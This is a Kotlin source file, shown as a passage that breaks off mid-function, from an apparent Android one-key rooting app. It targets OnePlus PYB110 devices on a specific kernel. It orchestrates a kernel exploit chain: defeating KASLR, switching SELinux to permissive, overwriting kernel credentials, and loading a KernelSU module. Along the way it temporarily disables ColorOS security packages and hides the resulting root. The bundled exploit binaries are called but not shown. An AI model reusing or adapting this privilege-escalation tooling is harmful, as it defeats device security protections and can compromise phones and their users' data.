package com.pyb110.onekey

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.SystemClock
import dev.onekey.jb.Prep
import dev.onekey.jb.RootDiagnostics
import dev.onekey.jb.ShizukuShell
import java.io.File
import java.io.FileInputStream
import java.security.MessageDigest
import java.util.UUID
import java.util.zip.ZipFile

/**
 * v2.4 稳定越狱引擎。
 *
 * 复用 v2.3.3 已验证的完整链路（同一套 v36/perf_cred/v42/Prep 与 root 收尾），
 * 由 Compose UI 直接调用，不再通过 run.sh 脚本解释执行，也不会调用任何旧版界面：
 *   抓 slide -> 反推 KASLR -> 重打 LKM -> permissive -> 挑 cred -> fsuid=0
 *   -> 两阶段写 cap -> finit_module -> 安装配套 ksud -> 登记管理器
 *   -> 开启 su_compat -> 三项 su 验收 -> 隐藏环境自检 -> 清理临时文件
 *
 * 默认不创建任何全局 su 挂载/overlay（隐藏环境优先）。
 */
class StableEngine(
    private val ctx: Context,
    private val logSink: (String) -> Unit,
    private val stageSink: (String) -> Unit,
    private val progressSink: (Int) -> Unit,
) {
    companion object {
        private const val DEVICE_MODEL = "PYB110"
        private const val KERNEL_RELEASE = "6.18.21-android17-5-gf957accaf563-ab15926176-4k"
        private const val KSU_CERT = "79e590113c4c4c0c222978e413a5faa801666957b1212a328e46c00c69821bf7"
        private const val SUKI_CERT = "947ae944f3de4ed4c21a7e4f7953ecf351bfa2b36239da37a34111ad29993eef"
    }

    /** 管理器组合：模板、ksud 来源、root 收尾参数都随管理器切换。 */
    private data class ManagerSpec(
        val kind: String,
        val backend: String,
        val pkg: String,
        val label: String,
        val expectedVersion: String?,
        val certSha256: String?,
        val templateAsset: String,
        val bundledKsud: String?,
        val expectedKsudVersion: String?,
        val strict: Boolean,
        val perfLoader: String,
        val bootstrapPath: String,
    )

    /**
     * 4 个管理器统一使用「上游按本机 6.18.21 内核源码自编」的 LKM + 配套 ksud：
     * 内核侧 sucompat 完整，管理器授权后应用直接能 su，不需要任何用户态 overlay（不漏环境）。
     */
    private val specs: Map<String, ManagerSpec> = listOf(
        ManagerSpec(
            kind = "next", backend = "ksu", pkg = "com.rifsxd.ksunext", label = "KernelSU-Next",
            expectedVersion = "v3.4.2", certSha256 = null,
            templateAsset = "pyb110/ksu-base-next.ko", bundledKsud = "core/ksud_next",
            expectedKsudVersion = null, strict = false,
            perfLoader = "perf_cred_sukisu", bootstrapPath = "/data/local/tmp/onekey/ksud_sukisu",
        ),
        ManagerSpec(
            kind = "sukisu", backend = "sukisu", pkg = "com.sukisu.ultra", label = "SukiSU Ultra",
            expectedVersion = "v4.3.0-r1", certSha256 = null,
            templateAsset = "pyb110/ksu-base-sukisu.ko", bundledKsud = "core/ksud_sukisu",
            expectedKsudVersion = null, strict = false,
            // 与上游 loader2 一致：只传 allow_shell=1（不传 bundled=1，避免被管理器识别成"内嵌 LKM 需更新"）
            perfLoader = "perf_cred_sukisu", bootstrapPath = "/data/local/tmp/onekey/ksud_sukisu",
        ),
        ManagerSpec(
            kind = "kernelsu", backend = "kernelsu", pkg = "me.weishu.kernelsu", label = "KernelSU 官方",
            expectedVersion = "v3.3.1", certSha256 = null,
            templateAsset = "pyb110/ksu-base.ko", bundledKsud = "core/ksud_official",
            expectedKsudVersion = null, strict = false,
            perfLoader = "perf_cred_sukisu", bootstrapPath = "/data/local/tmp/onekey/ksud_sukisu",
        ),
        ManagerSpec(
            kind = "bakasu", backend = "bakasu", pkg = "com.resukisu.resukisu", label = "BakaSU",
            expectedVersion = "v4.2.0-rc3", certSha256 = null,
            templateAsset = "pyb110/ksu-base-bakasu.ko", bundledKsud = "core/ksud_bakasu",
            expectedKsudVersion = null, strict = false,
            perfLoader = "perf_cred_sukisu", bootstrapPath = "/data/local/tmp/onekey/ksud_sukisu",
        ),
        ManagerSpec(
            kind = "finasu", backend = "finasu", pkg = "me.yuki.fina", label = "FinaSU",
            expectedVersion = "v1.4.5", certSha256 = null,
            templateAsset = "core/finasu.ko", bundledKsud = "core/ksud_finasu",
            expectedKsudVersion = null, strict = false,
            perfLoader = "perf_cred_sukisu", bootstrapPath = "/data/local/tmp/onekey/ksud_sukisu",
        ),
    ).associateBy { it.kind }

    /** 每次运行使用全新工作目录，避免上次遗留的 root 属主目录导致 shell 无法投放（Permission denied）。 */
    private val workDir: String = "/data/local/tmp/onekey-" + System.currentTimeMillis()
    private var disableAntiRoot = false
    private var suCompatEnabled = false
    private var softRebootEnabled = false
    private var stepIndex = 0
    private var progressMax = 0

    private fun log(msg: String) = logSink(msg)
    private fun progress(pct: Int) = progressSink(pct.coerceIn(0, 100))

    private fun step(title: String) {
        log("")
        log("== " + title + " ==")
        stepIndex++
        stageSink(title)
        val pct = minOf(95, 8 + stepIndex * 7)
        progressMax = maxOf(progressMax, pct)
        progress(progressMax)
    }

    // ------------------------------------------------------------------ entry
    fun run(managerKind: String, disableAntiRoot: Boolean, suCompat: Boolean, softReboot: Boolean = false, adapter: RuntimeExtractor.Adapter? = null, managerPkg: String? = null): Boolean {
        this.disableAntiRoot = disableAntiRoot
        this.suCompatEnabled = suCompat
        this.softRebootEnabled = softReboot
        log("========== OneKey · 稳定链开始 ==========")
        log(
            "设备: " + Build.MANUFACTURER + " " + Build.MODEL
                + " / Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")"
        )
        var spec = specs[managerKind]
        if (spec == null) {
            log("未知管理器: " + managerKind + "；已停止执行。")
            stageSink("未知管理器")
            return false
        }
        if (!managerPkg.isNullOrBlank() && managerPkg != spec.pkg) {
            spec = spec.copy(pkg = managerPkg)
        }
        if (!ShizukuShell.available()) {
            log("Stellar 未运行。请先打开 Stellar，用「无线调试」启动服务后再回来。")
            stageSink("Stellar 未运行")
            return false
        }
        if (!ShizukuShell.hasPermission()) {
            log("尚未获得 Stellar 权限，请回首页点击「授予 Stellar 权限」。")
            stageSink("等待 Stellar 权限")
            return false
        }
        log("Stellar 已连接，shell uid=" + ShizukuShell.serviceUid())

        val kernel = ShizukuShell.run("uname -r", 15)
        if (kernel.code != 0 || kernel.output.trim().isEmpty()) {
            log("读取内核版本失败：" + kernel.output.trim())
            stageSink("设备信息读取失败")
            return false
        }
        val kernelRel = kernel.output.trim()
        log("内核: " + kernelRel)
        val profile = DeviceProfiles.current()
        if (profile == null) {
            log("✗ 机型/内核不在支持范围（" + Build.MODEL + " / " + kernelRel + "）")
            log("  当前仅支持 OnePlus 16 PYB110 / 6.18.21 和 OnePlus Ace 7 Pro PMS110 / 6.12.69。")
            return false
        }
        if (!profile.supportsStable) {
            log("✗ " + profile.displayName + " 不支持 64560 稳定链，请使用 98260 新链。")
            return false
        }

        // 当前内核/SELinux/模块状态
        val st = ShizukuShell.run("id && getenforce && cat /proc/modules", 30)
        if (st.code != 0 || RootDiagnostics.hasLine(st.output, "Disabled")) {
            log("无法确认内核和 SELinux 状态，停止执行：" + st.output)
            return false
        }
        for (line in st.output.split("\n")) if (line.trim().isNotEmpty()) log("  " + line.trim())
        var loadedLine: String? = null
        for (line in st.output.split("\n")) if (line.startsWith("kernelsu ")) loadedLine = line
        val moduleLoaded = loadedLine != null
        val permissive = st.output.contains("Permissive")
        if (moduleLoaded && !RootDiagnostics.moduleLive(loadedLine)) {
            log("内核模块尚未就绪，停止操作；请稍后再试。")
            return false
        }
        if (moduleLoaded) {
            val info = ShizukuShell.run("timeout 10 /system/bin/su -c '/data/adb/ksud debug info'", 15)
            val infoText = info.output
            for (line in infoText.split("\n")) if (line.trim().isNotEmpty()) log("  " + line.trim())
            val current = detectLoadedSpec(infoText)
            if (current == null) {
                log("无法识别当前已加载的内核，已停止；请完整重启后重新选择管理器。")
                return false
            }
            spec = current
            log("当前内核运行 " + spec.label + "，本次按当前内核修复；切换另一种内核需先重启。")
        }
        if (!managerPkg.isNullOrBlank() && managerPkg != spec.pkg) {
            spec = spec.copy(pkg = managerPkg)
        }
        if (moduleLoaded && spec.kind != managerKind) {
            log("当前已加载内核与所选管理器不一致（已加载 " + spec.label + "，选择 " + managerKind + "），已停止；请完整重启后再切换。")
            return false
        }
        if (adapter != null && spec.kind != adapter.kind) {
            log("当前内核与自适应材料的管理器不一致，已停止；请完整重启后重试。")
            return false
        }
        if (adapter != null) {
            val live = try {
                ctx.packageManager.getPackageInfo(spec.pkg, 0).let {
                    if (android.os.Build.VERSION.SDK_INT >= 28) it.longVersionCode.toInt() else @Suppress("DEPRECATION") it.versionCode
                }
            } catch (e: Exception) { -1 }
            if (live != adapter.versionCode) {
                log("管理器在准备后发生变化，已停止；请重新准备。")
                return false
            }
            val certNow = managerCert(spec.pkg)?.second
            if (certNow == null || certNow != adapter.certSha256) {
                log("管理器签名在准备后发生变化，已停止；请重新准备。")
                return false
            }
        }
        if (!checkManager(spec)) {
            stageSink("管理器检查失败")
            return false
        }
        // v2.5.17：优先上游 loader2/w2 链（v2.5.5 同款加载），失败且模块未加载时回退 v1.8 兼容链。
        val upstreamOk = runUpstream(spec, adapter)
        if (upstreamOk) return true
        val modNow = ShizukuShell.run("grep -qi kernelsu /proc/modules && echo YES || echo NO", 10).output.contains("YES")
        if (modNow) return false
        if (adapter != null) {
            if (spec.kind == "finasu") {
                log("FinaSU 自适应材料加载失败，自动改用内置兼容组件重试一次…")
                return runUpstream(spec, null)
            }
            log("自适应材料加载失败；按模式隔离要求停止，不回退内置模块。")
            return false
        }
        log("上游链未完成加载，切换 v1.8 兼容链重试一次…")
        if (!stageRootUserspace(spec)) {
            stageSink("配套用户态准备失败")
            return false
        }
        if (moduleLoaded) {
            log("已加载 KernelSU：检查配套关系并修复 root 环境。")
            val fixed = rootStageAndVerify()
            if (fixed) {
                finishOk(spec)
            } else {
                progress(100)
                log("✗ 修复未通过：请把日志发给开发者，或重启手机后再试。")
            }
            return fixed
        }
        return exploitAndLoad(spec, permissive)
    }

    // --------------------------------------- 越狱核心流程（自有编排，v1.8 稳定收尾）
    private class StageResult(val exitCode: Int, val stalled: Boolean, val raw: List<String>)

    private fun shQuote(v: String): String = "'" + v.replace("'", "'\\''") + "'"

    private fun dumpTail(raw: List<String>) {
        val tail = if (raw.size <= 40) raw else raw.subList(raw.size - 40, raw.size)
        for (l in tail) if (l.isNotBlank()) log("  " + l)
    }

    /** 运行一个阶段脚本：逐行回收输出、空闲/总超时、阶段与心跳映射。 */
    private fun runStage(title: String, cmd: String, totalSec: Long, idleSec: Long): StageResult {
        step(title)
        val raw = ArrayList<String>()
        var lastRaw = 0L
        val last = java.util.concurrent.atomic.AtomicLong(System.currentTimeMillis())
        var exit = -1
        var stalled = false
        var proc: ShizukuShell.LineProc? = null
        try {
            val p = ShizukuShell.start(cmd) { line ->
                val t = line.trim()
                if (t.startsWith("@TICK=")) last.set(System.currentTimeMillis())
                if (raw.size >= 500) raw.removeAt(0)
                raw.add(t)
                when {
                    t.startsWith("@STAGE=") -> {
                        val key = t.removePrefix("@STAGE=")
                        val name = when (key) {
                            "cap" -> "采集内核事件"
                            "solve" -> "校准内核地址"
                            "patch" -> "生成内核补丁"
                            "permissive" -> "切换安全策略"
                            "inject" -> "定位内核凭证"
                            "load" -> "加载内核模块"
                            "init" -> "初始化管理器"
                            "done" -> "越狱完成"
                            else -> null
                        }
                        if (name != null) stageSink(name)
                        val pct = minOf(94, progressMax + 7)
                        progressMax = maxOf(progressMax, pct)
                        progress(progressMax)
                    }
                    t.startsWith("@TICK=") -> {
                        val v = t.removePrefix("@TICK=").trim()
                        val detail = when {
                            v.startsWith("capture") -> "采集内核事件 " + v.removePrefix("capture").trim() + " / 300"
                            v.startsWith("solve") -> "正在校准内核地址（最多约 2 分钟）"
                            v.startsWith("patch") -> "正在生成内核补丁（最多约 2 分钟）"
                            v.startsWith("permissive") -> "等待安全策略切换 " + v.removePrefix("permissive").trim()
                            v.startsWith("cred") -> "正在定位内核凭证 " + v.removePrefix("cred").trim() + "s"
                            v.startsWith("load") -> "正在加载内核模块 " + v.removePrefix("load").trim()
                            v.startsWith("install") -> "安装配套用户态组件"
                            v.startsWith("manager") -> "登记管理器并开启隐藏特性"
                            v.startsWith("restart_manager") -> "重启管理器并检查内核连接"
                            else -> "运行中：" + v
                        }
                        stageSink(detail)
                        log("  " + detail)
                        val tgt = when {
                            v.startsWith("capture") -> 36
                            v.startsWith("solve") -> 40
                            v.startsWith("patch") -> 46
                            v.startsWith("permissive") -> 56
                            v.startsWith("cred") -> 65
                            v.startsWith("load") -> 74
                            v.startsWith("install") -> 84
                            v.startsWith("manager") -> 87
                            v.startsWith("restart_manager") -> 90
                            else -> progressMax
                        }
                        progressMax = maxOf(progressMax, minOf(94, tgt))
                        progress(progressMax)
                    }
                    t.startsWith("@WARN=") -> log("  " + t.removePrefix("@WARN="))
                    t.startsWith("@REPAIR=") -> {
                        val v = t.removePrefix("@REPAIR=")
                        val text = when (v) {
                            "scheduled" -> "已排队，完成后自动软重启"
                            "cleanup" -> "清理 ColorOS 安全模块"
                            "disabled" -> "未开启"
                            else -> v
                        }
                        log("  安全机制修复：" + text)
                    }
                    t.startsWith("@EXIT=") -> exit = t.removePrefix("@EXIT=").trim().toIntOrNull() ?: -1
                    t.isNotEmpty() -> {
                        val now2 = System.currentTimeMillis()
                        if (now2 - lastRaw > 3000L) {
                            lastRaw = now2
                            log("  " + t.take(180))
                        }
                    }
                }
            }
            proc = p
            val started = System.currentTimeMillis()
            while (p.isRunning()) {
                Thread.sleep(500)
                val now = System.currentTimeMillis()
                if (now - last.get() > idleSec * 1000L || now - started > totalSec * 1000L) {
                    stalled = true
                    break
                }
            }
            if (stalled) p.destroy()
            runCatching { p.proc.exitValue() }
        } catch (e: Throwable) {
            log("  阶段异常：" + e)
            stalled = true
        }
        return StageResult(exit, stalled, raw)
    }

    private fun stopLeftovers() {
        ShizukuShell.run(
            "pkill -f 'core.sh' 2>/dev/null; pkill -f 'cred.bin' 2>/dev/null; pkill -f 'writer.bin' 2>/dev/null; " +
                "pkill -f 'perm.bin' 2>/dev/null; pkill -f 'resolve.bin' 2>/dev/null; pkill -f 'patch.bin' 2>/dev/null; " +
                "pkill -f 'trace_pipe_raw' 2>/dev/null; true", 20
        )
    }

    private fun postMarker(workDir: String, runId: String): Boolean = try {
        String(ShizukuShell.readDeviceFile(workDir + "/post_stage.ok"), Charsets.UTF_8).trim() == "OK:" + runId
    } catch (e: Throwable) {
        false
    }

    /** 执行核心越狱：漏洞链（可选）→ root 收尾（管理器登记/管理器重启/su 验收）→ 可选软重启修复。 */
    private fun runUpstream(spec: ManagerSpec, adapter: RuntimeExtractor.Adapter? = null): Boolean {
        val lkmAsset: String
        var lkmDest: String
        val ksudAsset: String
        when (spec.kind) {
            "next" -> { lkmAsset = "core/next.ko"; lkmDest = "next.ko"; ksudAsset = "core/ksud_next" }
            "bakasu" -> { lkmAsset = "core/bakasu.ko"; lkmDest = "bakasu.ko"; ksudAsset = "core/ksud_bakasu" }
            "sukisu" -> { lkmAsset = "core/sukisu.ko"; lkmDest = "sukisu.ko"; ksudAsset = "core/ksud_sukisu" }
            "finasu" -> { lkmAsset = "core/finasu.ko"; lkmDest = "finasu.ko"; ksudAsset = "core/ksud_finasu" }
            else -> { lkmAsset = "core/official.ko"; lkmDest = "official.ko"; ksudAsset = "core/ksud_official" }
        }
        val consoleLog = "/data/local/tmp/onekey-console.log"

        step("清理旧残留")
        ShizukuShell.run(
            "for m in \$(awk '\$1==\"su_compat\" || \$1==\"onekey-su\" {print \$2}' /proc/mounts 2>/dev/null); do umount \"\$m\" 2>/dev/null; done; " +
                "rm -rf /data/adb/onekey-su /data/adb/onekey-su-compat /data/local/tmp/onekey /data/local/tmp/onekey-[0-9]* " +
                "/data/local/tmp/onekey.old.* /data/local/tmp/onekey-su /data/local/tmp/onekey-fix /data/local/tmp/onekey-console.log " +
                "/data/local/tmp/ksu-official.ko /data/local/tmp/ksud_official /data/local/tmp/CMD /data/local/tmp/CMD.run " +
                "/data/local/tmp/KSU_RESULT /data/local/tmp/KSU_RESULT2 /data/local/tmp/NOLOAD /data/local/tmp/DOLOAD " +
                "/data/local/tmp/ksu-op3.ko /data/local/tmp/ksud342 /data/local/tmp/ksu_grant /data/local/tmp/onekey_dir " +
                "/data/local/tmp/root_stage.sh /data/local/tmp/root_run /data/local/tmp/root_backend /data/local/tmp/root_manager_pkg " +
                "/data/local/tmp/root_manager_apk /data/local/tmp/root_expected_uapi /data/local/tmp/root_expected_version " +
                "/data/local/tmp/root_strict /data/local/tmp/root_antiroot /data/local/tmp/root_su_compat " +
                "/data/local/tmp/onekey_mgr_apk /data/local/tmp/onekey_mgr_pkg /data/local/tmp/su_repair_launch.log " +
                "/data/local/tmp/su_repair.log 2>/dev/null; true", 60
        )
        runCatching { TempJanitor.sweep(ctx, workDir) }

        step("准备越狱组件")
        val mk = ShizukuShell.run("mkdir -p " + workDir + " && chmod 755 " + workDir, 30)
        if (mk.code != 0) {
            log("创建工作目录失败：" + mk.output.trim())
            return false
        }
        val cache = assetCacheDir()
        ShizukuShell.run("mkdir -p " + shQuote(cache) + " && chmod 755 " + shQuote(cache), 20)
        val files = mutableListOf(
            "core/core.sh" to "core.sh",
            "core/post.sh" to "post.sh",
            "core/resolve.bin" to "resolve.bin",
            "core/patch.bin" to "patch.bin",
            "core/perm.bin" to "perm.bin",
            "core/cred.bin" to "cred.bin",
            "core/writer.bin" to "writer.bin",
            "core/loadgen.bin" to "loadgen.bin",
            (DeviceProfiles.current()?.symbolsAsset ?: "core/symbols.txt") to "symbols.txt",
        )
        val useBundledLkm = adapter == null || adapter.modulePath.isBlank()
        for ((asset, dest) in files) {
            val mode = if (dest.endsWith(".ko") || dest == "symbols.txt") 644 else 755
            if (!stageAssetCached(asset, listOf(workDir + "/" + dest), mode, cache)) {
                log("投放失败 " + dest)
                return false
            }
        }
        if (useBundledLkm) {
            val rel = ShizukuShell.run("uname -r", 5).output.trim()
            if (!stageAlignedLkm(lkmAsset, workDir + "/" + lkmDest, rel, cache)) {
                log("投放内核模块失败 " + lkmDest)
                return false
            }
        }
        val ksudDev = "/data/local/tmp/ksud_" + spec.kind
        val ksudDests = listOf(workDir + "/" + ksudDestTag(spec.kind), ksudDev, "/data/local/tmp/ksud_official")
        if (adapter == null && !stageAssetCached(ksudAsset, ksudDests, 755, cache)) {
            log("投放配套组件失败")
            return false
        }
        // 优先使用管理器 APK 自带的 ksud，避免内置 ksud 与 LKM/管理器版本不匹配导致 manager add 失败。
        val mgrKsud = extractKsudFromManager(spec)
        if (mgrKsud != null && mgrKsud.isNotEmpty()) {
            if (stageBytesCached(mgrKsud, "ksud-" + spec.kind, ksudDests, 755, cache)) {
                log("使用管理器自带 ksud（与 LKM/管理器版本匹配）")
            } else {
                log("投放管理器自带 ksud 失败，继续使用内置副本")
            }
        } else {
            log("管理器未提供 libksud.so，使用内置 ksud 副本")
        }
        if (adapter != null && adapter.modulePath.isNotBlank()) {
            try {
                val mod = java.io.File(adapter.modulePath).readBytes()
                val ks = java.io.File(adapter.ksudPath).readBytes()
                val mr = ShizukuShell.stageBytes(mod, workDir + "/adaptive.ko", 644)
                val kr = ShizukuShell.stageBytes(ks, workDir + "/ksud_adaptive", 755)
                if (mr.code != 0 || kr.code != 0) {
                    log("投放自适应材料失败：" + mr.output + " " + kr.output)
                    return false
                }
                val ko = ShizukuShell.stageBytes(ks, "/data/local/tmp/ksud_official", 755)
                val kd = ShizukuShell.stageBytes(ks, ksudDev, 755)
                if (ko.code != 0 || kd.code != 0) {
                    log("投放自适应 ksud 失败：" + ko.output + " " + kd.output)
                    return false
                }
                lkmDest = "adaptive.ko"
                log("使用运行时提取材料：module=" + adapter.moduleSize + " B, vermagic=" + adapter.vermagic)
            } catch (e: Throwable) {
                log("读取自适应材料失败：" + e.message)
                return false
            }
        }
        val apkPath = try {
            ctx.packageManager.getApplicationInfo(spec.pkg, 0).sourceDir
        } catch (e: Exception) {
            ""
        }
        ShizukuShell.stageBytes((workDir + "\n").toByteArray(Charsets.UTF_8), "/data/local/tmp/onekey_dir", 644)
        ShizukuShell.stageBytes((apkPath + "\n").toByteArray(Charsets.UTF_8), "/data/local/tmp/onekey_mgr_apk", 644)
        ShizukuShell.stageBytes((spec.pkg + "\n").toByteArray(Charsets.UTF_8), "/data/local/tmp/onekey_mgr_pkg", 644)
        val mgrSig = managerCert(spec.pkg)
        val mgrSize = mgrSig?.first?.toString() ?: ""
        val mgrHash = mgrSig?.second ?: ""
        if (mgrSig == null) log("读取管理器签名失败，将退回 ksud debug get-sign")
        // 安全组件的临时停用移到 core.sh 的加载阶段，缩短禁用窗口，避免截屏/安全功能长时间不可用。
        // 记录安全组件原始状态，供 post 精确恢复（不能默认把用户原本禁用的组件强行启用）。
        val secPkgs = listOf("com.oplus.exsystemservice", "com.coloros.securityguard", "com.oplus.safecenter")
        val secState = secPkgs.joinToString("; ") { pkg ->
            val q = shQuote("package:" + pkg)
            val qd = shQuote(pkg + "=disabled")
            val qe = shQuote(pkg + "=enabled")
            val qu = shQuote(pkg + "=unknown")
            "if pm list packages -d 2>/dev/null | grep -qx " + q + "; then echo " + qd +
                "; elif pm list packages -e 2>/dev/null | grep -qx " + q + "; then echo " + qe +
                "; else echo " + qu + "; fi"
        }
        ShizukuShell.run("{ " + secState + "; } > " + shQuote(workDir + "/security.state") + " 2>/dev/null; true", 30)
        stopLeftovers()
        pkillExploitHelpers()

        var moduleLoaded = ShizukuShell.run("grep -qi kernelsu /proc/modules && echo YES || echo NO", 10).output.contains("YES")
        if (!moduleLoaded) {
            val cmd = "cd " + shQuote(workDir) + " && env ONEKEY_WORK=" + shQuote(workDir) +
                " ONEKEY_MANAGER=" + shQuote(spec.kind) + " ONEKEY_LKM=" + shQuote(lkmDest) + " ONEKEY_ANTIROOT=" + shQuote(if (disableAntiRoot) "1" else "0") + " sh core.sh 2>&1 | tee " + shQuote(consoleLog)
            val res = runStage("执行越狱核心流程", cmd, 900, 180)
            if (res.stalled) {
                log("  ⚠ 核心流程长时间无响应，已中断")
                stopLeftovers()
                dumpTail(res.raw)
                restoreSecurityFromState()
                cleanupTemp()
                return false
            }
            log("  核心流程退出码=" + res.exitCode)
            moduleLoaded = ShizukuShell.run("grep -qi kernelsu /proc/modules && echo YES || echo NO", 10).output.contains("YES")
            if (!moduleLoaded) {
                log("内核模块未加载（退出码=" + res.exitCode + "），请把日志发给开发者。")
                dumpTail(res.raw)
                restoreSecurityFromState()
                cleanupTemp()
                return false
            }
            log("  内核模块已加载 ✓")
        } else {
            log("  检测到内核模块已加载，跳过漏洞链，直接修复用户态")
        }

        // root 收尾：走 v1.8 稳定的 KSU fd 通道，不触碰 /data/system/packages.list
        val runId = java.util.UUID.randomUUID().toString()
        val repair = if (softRebootEnabled) "1" else "0"
        val kg = ShizukuShell.stageAsset(ctx, "ksu_grant", "/data/local/tmp/ksu_grant", 755)
        val ps = ShizukuShell.stageAsset(ctx, "core/post.sh", "/data/local/tmp/post.sh", 755)
        if (kg.code != 0 || ps.code != 0) {
            log("投放 root 收尾组件失败")
            cleanupTemp()
            return false
        }
        if (suCompatEnabled) {
            ShizukuShell.stageAsset(ctx, "su_forward", workDir + "/su_forward", 755)
            ShizukuShell.stageAsset(ctx, "su_path_compat.sh", workDir + "/su_path_compat.sh", 755)
        }
        ShizukuShell.run("rm -f " + shQuote(workDir + "/post_stage.ok") + " /data/local/tmp/post_stage.ok 2>/dev/null; true", 15)
        val wrapper = listOf(
            "ONEKEY_WORK=" + shQuote(workDir),
            "ONEKEY_PKG=" + shQuote(spec.pkg),
            "ONEKEY_KSUD=" + shQuote(ksudDev),
            "ONEKEY_REPAIR=" + shQuote(repair),
            "ONEKEY_RUN=" + shQuote(runId),
            "ONEKEY_MANAGER=" + shQuote(spec.kind),
            "ONEKEY_ANTIROOT=" + shQuote(if (disableAntiRoot) "1" else "0"),
            "ONEKEY_SUCOMPAT=" + shQuote(if (suCompatEnabled) "1" else "0"),
            "ONEKEY_MGR_SIZE=" + shQuote(mgrSize),
            "ONEKEY_MGR_HASH=" + shQuote(mgrHash),
            "export ONEKEY_WORK ONEKEY_PKG ONEKEY_KSUD ONEKEY_REPAIR ONEKEY_RUN ONEKEY_ANTIROOT ONEKEY_SUCOMPAT ONEKEY_MGR_SIZE ONEKEY_MGR_HASH ONEKEY_MANAGER",
            "exec sh /data/local/tmp/post.sh",
            ""
        ).joinToString("\n")
        val wr = ShizukuShell.stageBytes(wrapper.toByteArray(Charsets.UTF_8), "/data/local/tmp/root_stage.sh", 755)
        if (wr.code != 0) {
            log("投放 root 收尾入口失败：" + wr.output)
            cleanupTemp()
            return false
        }
        var res = runStage("初始化管理器与 su 通道", "exec /data/local/tmp/ksu_grant", 480, 180)
        var postOk = !res.stalled && res.exitCode == 0 && postMarker(workDir, runId)
        if (!postOk) {
            log("  KSU 通道执行未通过（退出码=" + res.exitCode + "），尝试 su 方式重试")
            val suCmd = "timeout 300 /system/bin/su -c " + shQuote("sh /data/local/tmp/root_stage.sh") + " 2>&1"
            res = runStage("初始化管理器（su 重试）", suCmd, 300, 150)
            postOk = !res.stalled && res.exitCode == 0 && postMarker(workDir, runId)
        }
        if (postOk) {
            log("  管理器与 su 通道初始化完成 ✓")
        } else {
            log("  管理器初始化未完全确认；打开一次管理器后点「修复」即可。")
            restoreSecurityFromState()
            log("已按原始状态恢复 ColorOS 安全组件（避免截屏异常）")
            dumpTail(res.raw)
            stopLeftovers()
        }
        cleanupTemp()
        return postOk
    }

    /** 失败路径：按 security.state 恢复安全组件，避免加载失败后截屏/安全功能长期不可用。 */
    private fun restoreSecurityFromState() {
        val cmd = try {
            val state = String(ShizukuShell.readDeviceFile(workDir + "/security.state"), Charsets.UTF_8)
            val parts = ArrayList<String>()
            for (line in state.split("\n")) {
                val idx = line.indexOf('=')
                if (idx <= 0) continue
                val pkg = line.substring(0, idx).trim()
                val st = line.substring(idx + 1).trim()
                when (st) {
                    "disabled" -> parts.add("timeout 15 pm disable-user --user 0 " + shQuote(pkg) + " >/dev/null 2>&1")
                    "enabled" -> parts.add("timeout 15 pm enable " + shQuote(pkg) + " >/dev/null 2>&1")
                }
            }
            if (parts.isEmpty()) ""
            else parts.joinToString("; ") + "; echo SECURITY_RESTORED"
        } catch (e: Throwable) {
            "timeout 15 pm enable com.oplus.exsystemservice >/dev/null 2>&1; timeout 15 pm enable com.coloros.securityguard >/dev/null 2>&1; timeout 15 pm enable com.oplus.safecenter >/dev/null 2>&1; echo SECURITY_RESTORED"
        }
        if (cmd.isNotBlank()) ShizukuShell.run(cmd, 30)
    }

    /** 直接读取管理器签名证书，计算 ksud manager add 需要的 cert size + SHA-256。 */
    private fun managerCert(pkg: String): Pair<Int, String>? = try {
        val pm = ctx.packageManager
        val bytes: ByteArray = if (Build.VERSION.SDK_INT >= 28) {
            val info = pm.getPackageInfo(pkg, PackageManager.GET_SIGNING_CERTIFICATES)
            val si = info.signingInfo
            if (si == null) return null
            val signers = if (si.apkContentsSigners.isNotEmpty()) si.apkContentsSigners else si.signingCertificateHistory
            signers.first().toByteArray()
        } else {
            @Suppress("DEPRECATION")
            val info = pm.getPackageInfo(pkg, PackageManager.GET_SIGNATURES)
            @Suppress("DEPRECATION")
            (info.signatures?.firstOrNull() ?: return null).toByteArray()
        }
        val md = java.security.MessageDigest.getInstance("SHA-256")
        val hex = md.digest(bytes).joinToString("") { String.format("%02x", it) }
        bytes.size to hex
    } catch (e: Throwable) {
        log("读取管理器签名异常: " + e)
        null
    }

    private fun assetCacheDir(): String = try {
        val code = ctx.packageManager.getPackageInfo(ctx.packageName, 0).versionCode
        "/data/local/tmp/onekey-cache-" + code
    } catch (e: Exception) {
        "/data/local/tmp/onekey-cache"
    }

    /** 资产缓存：首次从 APK 投放，之后硬链接到本次工作目录，避免每次重复推送十几 MB。 */
    private fun stageAssetCached(asset: String, dests: List<String>, mode: Int, cache: String): Boolean {
        val name = dests.first().substringAfterLast('/')
        val cachePath = cache + "/" + name
        val size = try {
            ctx.assets.open(asset).use { it.available() }
        } catch (e: Exception) {
            -1
        }
        if (size > 0) {
            val hit = ShizukuShell.run(
                "if [ -f " + shQuote(cachePath) + " ] && [ \"$(wc -c < " + shQuote(cachePath) + ")\" -eq " + size + " ]; then echo HIT; else echo MISS; fi", 20
            )
            if (hit.output.contains("HIT")) return linkCached(cachePath, dests, mode)
        }
        val st = ShizukuShell.stageAsset(ctx, asset, cachePath, mode)
        if (st.code != 0) {
            log("缓存投放失败 " + name + "：" + st.output)
            return false
        }
        return linkCached(cachePath, dests, mode)
    }

    /** 字节资产缓存：用 SHA-256 判断是否需要重新投放（管理器自带 ksud 用）。 */
    private fun stageBytesCached(bytes: ByteArray, name: String, dests: List<String>, mode: Int, cache: String): Boolean {
        val cachePath = cache + "/" + name
        val md = java.security.MessageDigest.getInstance("SHA-256")
        val hash = md.digest(bytes).joinToString("") { String.format("%02x", it) }
        val hit = ShizukuShell.run(
            "if [ -f " + shQuote(cachePath) + " ] && [ \"$(wc -c < " + shQuote(cachePath) + ")\" -eq " + bytes.size +
                " ] && [ \"$(cat " + shQuote(cachePath + ".sha") + " 2>/dev/null)\" = " + shQuote(hash) +
                " ]; then echo HIT; else echo MISS; fi", 20
        )
        if (!hit.output.contains("HIT")) {
            val st = ShizukuShell.stageBytes(bytes, cachePath, mode)
            if (st.code != 0) {
                log("缓存投放失败 " + name + "：" + st.output)
                return false
            }
            ShizukuShell.stageBytes((hash + "\n").toByteArray(Charsets.UTF_8), cachePath + ".sha", 644)
        }
        return linkCached(cachePath, dests, mode)
    }

    private fun linkCached(cachePath: String, dests: List<String>, mode: Int): Boolean {
        val cmd = dests.joinToString("; ") { d ->
